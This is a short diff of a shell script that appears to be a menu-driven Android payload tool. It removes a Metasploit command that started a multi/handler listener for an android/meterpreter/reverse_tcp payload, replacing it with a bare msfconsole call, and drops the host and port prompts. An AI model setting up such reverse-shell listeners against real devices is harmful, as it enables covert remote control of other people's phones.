@@ -160,10 +160,9 @@ read name
 
 function listener(){
 
-msfconsole -x 'use multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'
+msfconsole 
 
 }
-
 
 function android(){
 
@@ -349,8 +348,6 @@ case $cho in
         returu
      ;;
      2) clear
-        lhost
-        lport
         listener
         returu
      ;;
